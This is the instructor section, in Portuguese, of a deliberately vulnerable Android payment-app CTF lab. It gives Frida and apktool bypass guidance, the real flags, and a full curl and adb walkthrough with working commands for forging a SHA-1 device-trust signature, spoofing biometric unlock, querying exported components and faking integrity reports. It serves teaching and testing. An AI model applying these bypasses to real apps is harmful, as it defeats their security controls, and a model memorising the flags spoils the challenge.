  "nextStepHint": "configure the app base URL to reach the lab API from emulator or phone"
}
```

Sem flags, sem credenciais. Apenas âncoras didáticas.

### Eventos registrados (Fase 11)

`api_base_url_override_saved`, `api_base_url_override_cleared`,
`network_profile_fetched`, `pinning_mode_observed`

### O que NÃO está nesta fase (Fase 11)

- Frida scripts reais de bypass de pinning
- Pinning HTTPS real ativo (ainda HTTP local)
- Native lib / JNI
- Binary patching real
- QR scanner por câmera real
- Pinning impossível de bypassar

---

## 7. Fase 12 — App Integrity / NativeGate / TamperCheck (instrutor)

### O que foi implementado

**NativeGate** (`integrity/NativeGate.kt`):
- Tenta carregar a biblioteca nativa opcional `obsidian_native_gate` via `System.loadLibrary`.
- Se ausente (sem NDK), cai em fallback Kotlin seguro — o app não quebra.
- Método `getNativeGateStatus()` retorna um `NativeGateResult` com `statusLabel`,
  `bypassHintId` e `patchTargetName`.
- Bypass: hook o `init` block (ou o método JNI `nativeGateCheck`) para forçar
  `nativeLibraryLoaded = true` e `statusCode = 1`. Com Frida:
  ```js
  Java.use("com.obsidianpay.mobile.integrity.NativeGate").getNativeGateStatus.implementation = function () {
    // retornar NativeGateResult com statusLabel desejado
  };
  ```
- Com apktool: modificar o smali que chama `System.loadLibrary` para não lançar
  exceção (ou simplesmente remover o try/catch).
- strings tool: `strings libobsidian_native_gate.so` (quando presente) expõe
  o hint nativo — daí o bypass hint `strings-libobsidian-native`.

**TamperCheck** (`integrity/TamperCheck.kt`):
- Checa `FLAG_DEBUGGABLE` via `ApplicationInfo` — bypass hint `patch-debuggable-check`.
- Checa installer package via `getInstallerPackageName` — bypass hint `hook-package-manager`.
- Gera SHA-256 da assinatura do APK como preview — um APK recompilado/repackageado
  produz hash diferente (bypass hint `repackage-signature-mismatch`).
- Checa se `packageName == "com.obsidianpay.mobile"` — bypass hint `package-name-check`.
- Calcula `tamperScore` (0..100) — bypass hint `tamper-score`.
- Todos os checks são cliente-only: trivialmente bypassáveis via Frida.

**IntegrityScreen** (`ui/IntegrityScreen.kt`):
- Tela legítima de "App Integrity" — não chamada de vulnerabilidade.
- Botões: "Run Integrity Check", "Show Native Gate", "Send Integrity Report",
  "Clear Integrity State".
- Registra eventos: `integrity_check_started`, `tamper_check_completed`,
  `native_gate_checked`, `tamper_score_calculated`, `native_gate_hint_viewed`,
  `integrity_report_sent`, `integrity_report_cached`, `integrity_state_cleared`.

**Backend** (`/api/mobile/internal/app-integrity`):
- Recebe o relatório JSON do cliente.
- Retorna `integrityDecision` (accepted ou review-required) baseado em `tamperScore`.
- `integrityPolicy: "report-only"` — o servidor nunca bloca o app.
- `serverTrust: "client-asserted-integrity"` — ponto de ensino.
- `nextStepHint: "client-side integrity checks are patchable in this lab"`.

### Por que é patchável

O fluxo inteiro é client-side:
1. O `NativeGate` decide `nativeLibraryLoaded` dentro do processo do app.
2. O `TamperCheck` lê flags do próprio processo — um hook Frida pode retornar
   qualquer valor para `FLAG_DEBUGGABLE`, `getInstallerPackageName`, assinatura.
3. O `tamperScore` é calculado cliente-side e enviado como JSON sem qualquer
   assinatura HMAC ou nonce — a requisição pode ser forjada diretamente.
4. O servidor não tem como verificar independentemente — `integrityPolicy: "report-only"`.

### Fluxo futuro com JADX/apktool/Frida

1. JADX: localizar `NativeGate.kt` → ver `System.loadLibrary("obsidian_native_gate")`.
2. JADX: localizar `TamperCheck.kt` → ver `FLAG_DEBUGGABLE`, `getInstallerPackageName`.
3. apktool: desmontar → modificar smali de `TamperCheck.run()` para retornar score 0.
4. Frida: hook `TamperCheck.run()` → retornar `TamperResult` com `tamperScore=0`.
5. Frida: hook `NativeGate.getNativeGateStatus()` → retornar status "native-gate-open".
6. Enviar relatório modificado ao backend → receber `integrityDecision: "accepted"`.

### O que NÃO está nesta fase (Fase 12)

- Biblioteca C/C++ real obrigatória (sem NDK necessário para compilar)
- Frida script pronto de bypass
- Certificate pinning real
- QR scanner por câmera real
- Exploit real automatizado

---

## 8. Fase 13 — Dynamic Instrumentation Scaffold (instrutor)

> **Estado: Fase 13.** Esta fase adiciona o scaffold didático de instrumentação
> dinâmica: scripts Frida específicos do lab, playbook ADB e documentação de
> pentest mobile em `docs/mobile-pentest/`.

### Arquivos adicionados

```
lab-08-obsidianpay/
├── docs/mobile-pentest/
│   ├── SETUP.md              # ambiente: emulador, celular físico, Burp, Frida, adb, JADX, apktool
│   ├── PLAYBOOK.md           # sequência de tarefas de pentest manual
│   └── INSTRUCTOR-NOTES.md  # mapa de hint IDs → classes do app (este nível de detalhe)
├── tools/frida/
│   ├── README.md                      # como usar os scripts, spawn/attach mode
│   ├── 01-environment-bypass.js       # RootDetector / EmulatorDetector / EnvironmentRiskEngine
│   ├── 02-biometric-vault-bypass.js   # LocalAuthState / BiometricGate
│   ├── 03-network-pinning-observer.js # PinningPolicy / NetworkSecurityProfile / CertificatePinner
│   ├── 04-integrity-native-bypass.js  # NativeGate / TamperCheck
│   └── 05-webview-bridge-observer.js  # WebView addJavascriptInterface / ObsidianSupportBridge
└── tools/adb/
    ├── README.md                      # referência de comandos ADB do lab
    └── lab08-adb-playbook.sh          # playbook comentado
```

### Propósito dos scripts Frida

Cada script é um **scaffold didático** — não um exploit pronto. Demonstra os
pontos de hook corretos com `try/catch` por classe/método e logs
`[ObsidianPay Lab]`. O aluno deve completar ou ajustar o script para o objetivo
pretendido.

Os scripts são exclusivos do pacote `com.obsidianpay.mobile` e do ambiente
local autorizado. Não devem ser usados contra apps reais.

### Mapa hint ID → script

| Hint ID | Script | Classe |
|---|---|---|
| `hooks-change-return-values` | `01-environment-bypass.js` | `RootDetector`, `EmulatorDetector` |
| `patch-risk-engine-result` | `01-environment-bypass.js` | `EnvironmentRiskEngine` |
| `env-check-local-only` | `01-environment-bypass.js` | `EnvironmentRiskEngine` |
| `biometric-result-hook` | `02-biometric-vault-bypass.js` | `BiometricGate` |
| `force-auth-decision-true` | `02-biometric-vault-bypass.js` | `LocalAuthState.validateFallbackPin` |
| `patch-local-auth-state` | `02-biometric-vault-bypass.js` | `LocalAuthState.isVaultUnlocked` |
| `okhttp-certificate-pinner-hook` | `03-network-pinning-observer.js` | `CertificatePinner.check` (OkHttp) |
| `trust-user-ca` | `03-network-pinning-observer.js` | `NetworkSecurityProfile` |
| `network-config-cleartext-override` | `03-network-pinning-observer.js` | `NetworkSecurityProfile` |
| `jni-return-value-hook` | `04-integrity-native-bypass.js` | `NativeGate.getNativeGateStatus` |
| `patch-native-gate-result` | `04-integrity-native-bypass.js` | `NativeGate` |
| `hook-package-manager` | `04-integrity-native-bypass.js` | `TamperCheck.getInstallerPackage` |
| `patch-debuggable-check` | `04-integrity-native-bypass.js` | `TamperCheck.isDebuggable` |
| `repackage-signature-mismatch` | `04-integrity-native-bypass.js` | `TamperCheck.getPackageNameStatus` |

### O que NÃO está nesta fase

- Exploit end-to-end automatizado.
- Frida server setup automatizado.
- Biblioteca NDK C/C++ real.
- Bypass completo entregue "um clique".
- Flags nos scripts ou docs de instrumentação.

---

## 10. Fase 14 — Final Challenge Chain (instrutor)

A Fase 14 fecha o lab com a **cadeia oficial de CTF**: 9 estágios, flags
internas, scoring local e endpoint de submissão. Esta seção é **material de
instrutor** e contém as flags reais e o fluxo completo.

> Os valores das flags vivem em `api/src/flags.js`. O `api/src/challenge-chain.js`
> referencia apenas `flagKey`. Os docs públicos (`README`, `STUDENT-GUIDE`,
> `docs/CHALLENGE-SCORING.md`, etc.) **não** contêm flags.

### 10.1 Chain ID e endpoints

- **chainId:** `obsidianpay-mobile-final-chain` · **totalStages:** 9 · **máx:** 2000 pts
- `GET  /api/mobile/challenge/progress` — overview + estado por estágio (sem flags).
- `POST /api/mobile/challenge/submit` — valida flag, pontua (idempotente).
- `GET  /api/mobile/challenge/scoreboard` — placar do usuário.
- `POST /api/mobile/internal/finalize-operator` — etapa final (flag 09).

Todos exigem `Authorization: Bearer <token>` (login em `POST /api/mobile/login`).

### 10.2 Ordem oficial, flags e checkpoints

| # | Stage ID | Pts | Flag real | Como obter o checkpoint |
|---|---|---|---|---|
| 1 | `stage-01-recon` | 100 | `FLAG{obsidianpay_mobile_recon_01}` | `GET /api/mobile/config` + header `X-Obsidian-Recon: mobile-config-review` → `reconCheckpoint.flag` |
| 2 | `stage-02-insecure-storage` | 150 | `FLAG{obsidianpay_insecure_storage_02}` | `POST /api/mobile/support/sync` body `{"message":"...","cacheCheckpoint":"local-storage-review"}` → `localStorageCheckpoint.flag` |
| 3 | `stage-03-exported-components` | 200 | `FLAG{obsidianpay_exported_components_03}` | Trilha Android (Fase 7): `adb shell content query` no provider `com.obsidianpay.mobile.provider.notes` / `am broadcast` / `am start`. Flag validada no submit. |
| 4 | `stage-04-webview-bridge` | 200 | `FLAG{obsidianpay_webview_bridge_04}` | `GET /api/mobile/webview/support?topic=bridge-audit&message=cache-review` → bloco `bridgeCheckpoint` no HTML |
| 5 | `stage-05-device-trust` | 250 | `FLAG{obsidianpay_device_trust_05}` | `POST /api/mobile/internal/device-trust` com client id legacy + assinatura SHA-1 forjada → `deviceTrustCheckpoint.flag` |
| 6 | `stage-06-biometric-vault` | 250 | `FLAG{obsidianpay_biometric_vault_06}` | `POST /api/mobile/internal/vault-mobile/unlock` body `{"localAuth":true,"vaultUnlocked":true}` → `vaultCheckpoint.flag` |
| 7 | `stage-07-network-pinning` | 250 | `FLAG{obsidianpay_network_pinning_07}` | `GET /api/mobile/internal/network-profile` + header `X-Obsidian-Network-Review: burp-pinning-check` → `networkCheckpoint.flag` |
| 8 | `stage-08-app-integrity` | 300 | `FLAG{obsidianpay_integrity_bypass_08}` | `POST /api/mobile/internal/app-integrity` body `{"bypassHintIds":["jni-return-value-hook"]}` (ou `patch-native-gate-result`) → `integrityCheckpoint.flag` |
| 9 | `stage-09-final-operator-chain` | 400 | `FLAG{obsidianpay_final_operator_chain_09}` | `POST /api/mobile/internal/finalize-operator` (ver 10.4) |

### 10.3 Fluxo de submit

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:8102/api/mobile/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"guest","password":"guest123"}' | jq -r .token)

# Submeter a flag do estágio 1
curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"stageId":"stage-01-recon","flag":"FLAG{obsidianpay_mobile_recon_01}","evidence":"config recon header"}'
# => { "accepted": true, "pointsAwarded": 100, "totalScore": 100, "nextStageHint": "..." }
```

- Flag errada → `{ "accepted": false, "message": "Flag inválida para este estágio." }`.
- Reenvio de flag correta → `duplicate: true`, `pointsAwarded: 0` (idempotente).
- `GET /challenge/scoreboard` → `totalScore`, `solvedStages`, `completionPercent`, `finalUnlocked`.

### 10.4 Final operator chain

`POST /api/mobile/internal/finalize-operator` exige:

- Header `X-Obsidian-Device-Trust: trusted-legacy`.
- Body com as 4 provas (qualquer valor truthy): `deviceTrustProof`, `vaultProof`,
  `integrityProof`, `networkProof`.

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/finalize-operator \
  -H "Authorization: Bearer $TOKEN" \
  -H 'X-Obsidian-Device-Trust: trusted-legacy' -H 'Content-Type: application/json' \
  -d '{"deviceTrustProof":"sig","vaultProof":"unlock","integrityProof":"nativegate","networkProof":"pinning"}'
# => { "flag": "FLAG{obsidianpay_final_operator_chain_09}", ... }
```

Faltando header ou qualquer prova → `403` sem vazar a flag. A flag final é então
submetida em `/challenge/submit` com `stageId` `stage-09-final-operator-chain`.

### 10.5 Validação

`bash scripts/validate-phase14.sh` confere estrutura (arquivos, endpoints, 9
flags em `flags.js`, ausência de FLAG nos docs públicos) e, com Docker, sobe o
backend e exercita login/progress/submit/scoreboard.

---

## 11. Fase 15 — Walkthrough manual completo (instrutor)

> **Material de instrutor — contém as flags reais.** Esta seção é o guia manual,
> passo a passo, do início ao fim da cadeia. É deliberadamente detalhada (estilo
> "trabalho de formiga"): abra o app, faça login, vá à tela, observe a resposta,
> copie o valor, chame o endpoint, valide a evidência, submeta a flag, avance.
> Todo o ambiente é **local e autorizado** (`127.0.0.1:8102`). Nada aqui deve ser
> usado contra apps ou sistemas reais.

Os comandos usam `curl` + `jq` contra o backend local. Onde houver app Android, os
passos de UI/`adb` são descritos para emulador. O fluxo de submissão é sempre o
mesmo: obtenha a flag (checkpoint do backend ou trilha Android), e submeta em
`POST /api/mobile/challenge/submit` com `stageId` + `flag` + `evidence`.

### 15.1 Preparação do ambiente

1. **Suba o backend** a partir da pasta do lab:
   ```bash
   cd lab-08-obsidianpay
   docker compose up --build -d
   ```
2. **Confirme a porta 8102** e a saúde do serviço:
   ```bash
   curl -s http://127.0.0.1:8102/health
   # => {"status":"ok","name":"ObsidianPay Mobile","expectedPort":8102}
   ```
   Se `expectedPort` não for `8102`, algo está errado no compose — veja
   Troubleshooting (15.12).
3. **Emulador vs. celular físico:**
   - **Android Emulator:** o app fala com `http://10.0.2.2:8102` (alias do
     emulador para o `127.0.0.1` do host). Nenhuma configuração extra.
   - **Celular físico:** o aparelho **não** alcança `127.0.0.1` do PC. Descubra o
     IP do PC na LAN (ex.: `192.168.0.50`), abra a tela **API Host** no app e
     salve `http://192.168.0.50:8102`.
4. **API Host no app:** todos os fluxos de UI assumem que a base URL aponta para o
   backend do lab. Confirme na tela **API Host** antes de começar.
5. **Burp (opcional):** para observar o diálogo app↔API, configure o proxy do
   emulador/aparelho para o Burp e navegue. Não é necessário para os checkpoints
   de backend (que podem ser exercitados direto por `curl`).
6. **Android Studio / ADB / Frida (opcionais):** necessários apenas para as
   trilhas com o app (Stage 03 via `adb`, e instrumentação dinâmica). Os
   checkpoints de backend funcionam sem nenhum deles.

### 15.2 Login inicial

A conta pública do aluno é **`guest` / `guest123`**. Faça login e guarde o token:

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:8102/api/mobile/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"guest","password":"guest123"}' | jq -r .token)
echo "$TOKEN"
```

> As credenciais internas (`analyst`/`operator`) existem no backend para fases de
> descoberta, mas **não** são necessárias para a cadeia e **não** aparecem no
> Student Guide. Todo o fluxo abaixo funciona com `guest`.

Confira o progresso inicial (sem flags na resposta):

```bash
curl -s http://127.0.0.1:8102/api/mobile/challenge/progress \
  -H "Authorization: Bearer $TOKEN" | jq '{chainId, totalStages}'
# => { "chainId": "obsidianpay-mobile-final-chain", "totalStages": 9 }
```

---

### 15.3 Stage 01 — Mobile Recon

- **Objetivo:** reconhecer o contrato mobile e disparar o checkpoint de recon.
- **Tela/onde:** `GET /api/mobile/config` (config pública do app).
- **Header esperado:** `X-Obsidian-Recon: mobile-config-review`.
- **Onde a flag aparece:** no bloco `reconCheckpoint.flag` da resposta de config
  quando — e somente quando — o header de recon é enviado.

Passo a passo:

```bash
# 1. observe a config sem o header (sem checkpoint)
curl -s http://127.0.0.1:8102/api/mobile/config | jq 'has("reconCheckpoint")'
# => false

# 2. repita com o header de revisão de configuração mobile
curl -s http://127.0.0.1:8102/api/mobile/config \
  -H 'X-Obsidian-Recon: mobile-config-review' | jq .reconCheckpoint.flag
# => "FLAG{obsidianpay_mobile_recon_01}"
```

- **Flag real:** `FLAG{obsidianpay_mobile_recon_01}`.
- **Evidência esperada:** resposta de `/api/mobile/config` contendo o bloco
  `reconCheckpoint` ao enviar o header de recon.

Submeta:

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"stageId":"stage-01-recon","flag":"FLAG{obsidianpay_mobile_recon_01}","evidence":"config + X-Obsidian-Recon header"}'
# => { "accepted": true, "pointsAwarded": 100, "totalScore": 100, ... }
```

---

### 15.4 Stage 02 — Insecure Storage

- **Objetivo:** abusar do sync de suporte legado para revelar o checkpoint de
  armazenamento local.
- **Tela/onde:** `POST /api/mobile/support/sync` (no app: tela **Suporte** →
  sync). O backend ecoa o que o cliente afirma sobre o cache local.
- **Campo gatilho:** `cacheCheckpoint: "local-storage-review"` no body.
- **Onde a resposta pode ser cacheada (app):** após o sync, o app guarda o último
  payload localmente. Vale procurar em:
  - `SharedPreferences` (`/data/data/com.obsidianpay.mobile/shared_prefs/`),
  - `filesDir`/`cacheDir` (`.../files/`, `.../cache/obsidian-support-last-sync.json`),
  - SQLite (`databases/obsidianpay_local.db`, tabela `cached_*`/`debug_events`).

Passo a passo:

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/support/sync \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"message":"storage review","cacheCheckpoint":"local-storage-review"}' \
  | jq .localStorageCheckpoint.flag
# => "FLAG{obsidianpay_insecure_storage_02}"
```

- **Flag real:** `FLAG{obsidianpay_insecure_storage_02}`.
- **Evidência esperada:** resposta de `/api/mobile/support/sync` contendo
  `localStorageCheckpoint` (e, no device, o mesmo material cacheado em claro).

Submeta:

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"stageId":"stage-02-insecure-storage","flag":"FLAG{obsidianpay_insecure_storage_02}","evidence":"support/sync cacheCheckpoint"}'
# => { "accepted": true, "pointsAwarded": 150, ... }
```

---

### 15.5 Stage 03 — Exported Components

- **Objetivo:** demonstrar abuso de componentes Android **exportados** (Activity,
  BroadcastReceiver, ContentProvider) em ambiente local autorizado.
- **Componentes (Fase 7):**
  - Activity exportada `InternalOpsActivity` (action `com.obsidianpay.mobile.INTERNAL_OPS`).
  - BroadcastReceiver exportado `DebugCommandReceiver` (action `com.obsidianpay.mobile.DEBUG_COMMAND`).
  - ContentProvider exportado `ObsidianNotesProvider` (authority `com.obsidianpay.mobile.provider.notes`).
- **Comandos ADB (emulador local):**
  ```bash
  # ContentProvider exportado — caminhos de query
  adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/notes
  adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/debug
  adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/cache

  # Activity exportada
  adb shell am start -n com.obsidianpay.mobile/.platform.InternalOpsActivity \
    -a com.obsidianpay.mobile.INTERNAL_OPS \
    --es obsidian.intent.extra.RECEIPT_ID 1002

  # BroadcastReceiver exportado
  adb shell am broadcast -a com.obsidianpay.mobile.DEBUG_COMMAND \
    --es command write_debug_export --es route support/ops
  ```
  > No build debug o `applicationId` é `com.obsidianpay.mobile.debug`; ajuste o
  > alvo `-n`/pacote conforme o build instalado.
- **Evidência esperada:** saída de `adb` (content query / am broadcast / am start)
  demonstrando o componente exportado e o estado local afetado (visível na tela
  interna **Local State**: eventos `exported_*`/`external_debug_*`).

> **Importante (não inventar comportamento):** o ContentProvider **não** retorna a
> flag — por design ele só devolve notas de suporte, estado local e um
> `token_preview` mascarado (nunca o token inteiro nem `FLAG{`). Esta etapa é
> validada pela **cadeia/backend** mais a **evidência do componente exportado**. A
> flag oficial do estágio (referência de instrutor, vinda de `api/src/flags.js`) é
> `FLAG{obsidianpay_exported_components_03}` e é a que se submete à cadeia.

- **Flag real:** `FLAG{obsidianpay_exported_components_03}`.

Submeta (anexando a evidência do componente exportado):

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"stageId":"stage-03-exported-components","flag":"FLAG{obsidianpay_exported_components_03}","evidence":"adb content query provider.notes + am broadcast DEBUG_COMMAND"}'
# => { "accepted": true, "pointsAwarded": 200, ... }
```

---

### 15.6 Stage 04 — WebView Bridge

- **Objetivo:** usar o modo de auditoria da bridge da WebView de suporte.
- **Tela/onde:** **Suporte → Web Support** (portal em WebView). A WebView expõe a
  interface JavaScript `ObsidianBridge` (via `@JavascriptInterface`).
- **Endpoint:** `GET /api/mobile/webview/support?topic=bridge-audit&message=cache-review`.
- **Onde observar dados:** o portal detecta `window.ObsidianBridge` e renderiza um
  bloco `bridgeCheckpoint` no HTML do tópico de auditoria.

Passo a passo:

```bash
curl -s 'http://127.0.0.1:8102/api/mobile/webview/support?topic=bridge-audit&message=cache-review' \
  -H "Authorization: Bearer $TOKEN" | grep -o 'FLAG{obsidianpay_webview_bridge_04}'
# => FLAG{obsidianpay_webview_bridge_04}
```

- **Flag real:** `FLAG{obsidianpay_webview_bridge_04}`.
- **Evidência esperada:** HTML/JSON de `/api/mobile/webview/support` contendo
  `bridgeCheckpoint` para o tópico `bridge-audit`.

Submeta:

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"stageId":"stage-04-webview-bridge","flag":"FLAG{obsidianpay_webview_bridge_04}","evidence":"webview/support topic=bridge-audit bridgeCheckpoint"}'
# => { "accepted": true, "pointsAwarded": 200, ... }
```

---

### 15.7 Stage 05 — Device Trust

- **Objetivo:** forjar a assinatura legada fraca e ser aceito pelo device-trust.
- **Conceito:** o app (`security/HardcodedSecrets.kt`, `LegacyRequestSigner.kt`)
  monta a confiança localmente com um **salt embutido**. A assinatura é
  `sha1(username:deviceId:timestamp:salt)` — **sem HMAC, sem nonce**, forjável
  offline. O backend recomputa a mesma assinatura SHA-1 fraca.
- **Headers `X-Obsidian-*`:** `X-Obsidian-Client`, `X-Obsidian-Device`,
  `X-Obsidian-Timestamp`, `X-Obsidian-Signature`.
- **Checkpoint:** ao aceitar a assinatura, a resposta `trusted-legacy` inclui
  `deviceTrustCheckpoint.flag`.

Passo a passo (forja via shell):

```bash
SALT='obsidian-legacy-attestation-2026'
SIG=$(printf '%s' "guest:android-emulator-obsidian:1700000000000:$SALT" | sha1sum | cut -d' ' -f1)
curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/device-trust \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Obsidian-Client: obsidian-mobile-legacy-client" \
  -H "X-Obsidian-Device: android-emulator-obsidian" \
  -H "X-Obsidian-Timestamp: 1700000000000" \
  -H "X-Obsidian-Signature: $SIG" \
  -H 'Content-Type: application/json' \
  -d '{"deviceId":"android-emulator-obsidian","attestationMode":"legacy"}' \
  | jq .deviceTrustCheckpoint.flag
# => "FLAG{obsidianpay_device_trust_05}"
```

- **Flag real:** `FLAG{obsidianpay_device_trust_05}`.
- **Evidência esperada:** resposta `trusted-legacy` de
  `/api/mobile/internal/device-trust` contendo `deviceTrustCheckpoint`.

Submeta:

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"stageId":"stage-05-device-trust","flag":"FLAG{obsidianpay_device_trust_05}","evidence":"forged sha1 legacy signature accepted"}'
# => { "accepted": true, "pointsAwarded": 250, ... }
```

---

### 15.8 Stage 06 — Biometric Vault

- **Objetivo:** explorar a confiança client-side do vault.
- **Conceito:** o app (`auth/LocalAuthState.kt`, `auth/BiometricGate.kt`) decide
  **localmente** se o vault está desbloqueado e informa o servidor. O servidor
  **não** verifica biometria de forma independente — confia em `localAuth=true`.
- **Endpoint:** `POST /api/mobile/internal/vault-mobile/unlock`.
- **Checkpoint:** quando `localAuth=true` com decisão coerente
  (`vaultUnlocked`/`authDecision`), a resposta `vault-access-granted` inclui
  `vaultCheckpoint.flag`.

Passo a passo (bypass trivial via curl):

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/vault-mobile/unlock \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"localAuth":true,"vaultUnlocked":true,"method":"bypass","authDecision":"granted"}' \
  | jq .vaultCheckpoint.flag
# => "FLAG{obsidianpay_biometric_vault_06}"
```

- **Flag real:** `FLAG{obsidianpay_biometric_vault_06}`.
- **Evidência esperada:** resposta `vault-access-granted` de
  `/api/mobile/internal/vault-mobile/unlock` contendo `vaultCheckpoint`.

Submeta:

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"stageId":"stage-06-biometric-vault","flag":"FLAG{obsidianpay_biometric_vault_06}","evidence":"localAuth=true accepted by server"}'
# => { "accepted": true, "pointsAwarded": 250, ... }
```

---

### 15.9 Stage 07 — Network/Pinning

- **Objetivo:** acessar o modo de revisão de rede/pinning (report-only).
- **Conceito:** o perfil de rede descreve a postura de pinning **report-only**, o
  cleartext local e os hint IDs de bypass. A tela **API Host** mostra o perfil; o
  Burp pode observar o tráfego. O pinning não é forçado (scaffold).
- **Endpoint:** `GET /api/mobile/internal/network-profile`.
- **Header esperado:** `X-Obsidian-Network-Review: burp-pinning-check`.
- **Checkpoint:** com o header de revisão, a resposta inclui `networkCheckpoint.flag`.

Passo a passo:

```bash
curl -s http://127.0.0.1:8102/api/mobile/internal/network-profile \
  -H "Authorization: Bearer $TOKEN" \
  -H 'X-Obsidian-Network-Review: burp-pinning-check' \
  | jq .networkCheckpoint.flag
# => "FLAG{obsidianpay_network_pinning_07}"
```

- **Flag real:** `FLAG{obsidianpay_network_pinning_07}`.
- **Evidência esperada:** resposta de `/api/mobile/internal/network-profile`
  contendo `networkCheckpoint`.

Submeta:

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"stageId":"stage-07-network-pinning","flag":"FLAG{obsidianpay_network_pinning_07}","evidence":"network-profile + X-Obsidian-Network-Review header"}'
# => { "accepted": true, "pointsAwarded": 250, ... }
```

---

### 15.10 Stage 08 — App Integrity

- **Objetivo:** demonstrar que a integridade é client-asserted/report-only.
- **Conceito:** o app (`integrity/NativeGate.kt`, `integrity/TamperCheck.kt`)
  calcula um relatório de integridade **no próprio processo**. O servidor confia
  no relatório (`integrityPolicy: report-only`) — totalmente patchável. Os
  `bypassHintIds` (`jni-return-value-hook`, `patch-native-gate-result`) apontam os
  pontos de hook/patch.
- **Endpoint:** `POST /api/mobile/internal/app-integrity`.
- **Checkpoint:** ao reportar um `bypassHintId` de NativeGate, a resposta inclui
  `integrityCheckpoint.flag`.

Passo a passo:

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/app-integrity \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"bypassHintIds":["jni-return-value-hook"],"tamperScore":0}' \
  | jq .integrityCheckpoint.flag
# => "FLAG{obsidianpay_integrity_bypass_08}"
```

- **Flag real:** `FLAG{obsidianpay_integrity_bypass_08}`.
- **Evidência esperada:** resposta de `/api/mobile/internal/app-integrity`
  contendo `integrityCheckpoint`.

Submeta:

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"stageId":"stage-08-app-integrity","flag":"FLAG{obsidianpay_integrity_bypass_08}","evidence":"app-integrity report with NativeGate bypassHintId"}'
# => { "accepted": true, "pointsAwarded": 300, ... }
```

---

### 15.11 Stage 09 — Final Operator Chain

- **Objetivo:** consolidar todas as trilhas internas e destravar a flag final.
- **Pré-requisitos:** ter dominado device-trust (Stage 05), vault (Stage 06),
  integridade (Stage 08) e rede (Stage 07) — as quatro provas abaixo representam
  esse domínio.
- **Endpoint:** `POST /api/mobile/internal/finalize-operator`.
- **Header obrigatório:** `X-Obsidian-Device-Trust: trusted-legacy`.
- **Body com as 4 provas** (qualquer valor truthy): `deviceTrustProof`,
  `vaultProof`, `integrityProof`, `networkProof`.

> Faltando o header **ou** qualquer prova, o endpoint responde **403** e **não**
> vaza a flag final.

Passo a passo:

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/finalize-operator \
  -H "Authorization: Bearer $TOKEN" \
  -H 'X-Obsidian-Device-Trust: trusted-legacy' -H 'Content-Type: application/json' \
  -d '{"deviceTrustProof":"sig","vaultProof":"unlock","integrityProof":"nativegate","networkProof":"pinning"}' \
  | jq .flag
# => "FLAG{obsidianpay_final_operator_chain_09}"
```

- **Flag final:** `FLAG{obsidianpay_final_operator_chain_09}`.

Submeta a flag final (`stage-09-final-operator-chain`):

```bash
curl -s -X POST http://127.0.0.1:8102/api/mobile/challenge/submit \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"stageId":"stage-09-final-operator-chain","flag":"FLAG{obsidianpay_final_operator_chain_09}","evidence":"finalize-operator with device-trust header + 4 proofs"}'
# => { "accepted": true, "pointsAwarded": 400, "totalScore": 2000, ... }
```

Scoreboard final:

```bash
curl -s http://127.0.0.1:8102/api/mobile/challenge/scoreboard \
  -H "Authorization: Bearer $TOKEN" \
  | jq '{totalScore, solvedStages, totalStages, completionPercent, finalUnlocked}'
# => { "totalScore": 2000, "solvedStages": 9, "totalStages": 9,
#      "completionPercent": 100, "finalUnlocked": true }
```

---

### 15.12 Troubleshooting

| Sintoma | Causa provável | Ação |
|---|---|---|
| Backend não sobe | imagem antiga / build quebrado | `docker compose down` e `docker compose up --build` novamente; ler o log do container. |
| Porta 8102 ocupada | outro processo usando a porta | `lsof -i :8102` (ou `ss -ltnp`), encerrar o processo; ou ajustar o mapeamento no compose só localmente. |
| Android SDK ausente | sem Android Studio/SDK | os checkpoints de backend funcionam por `curl`; só Stage 03 (adb) e a instrumentação dependem do SDK. |
| Emulador não conecta | usando `127.0.0.1` no emulador | no app, a base URL deve ser `http://10.0.2.2:8102`. |
| Celular físico não conecta | usando `10.0.2.2`/`127.0.0.1` no aparelho | use a tela **API Host** com `http://<IP_DO_PC>:8102` (mesma LAN). |
| API Host errado | override salvo apontando para host inválido | limpe o override na tela **API Host** e salve a URL correta. |
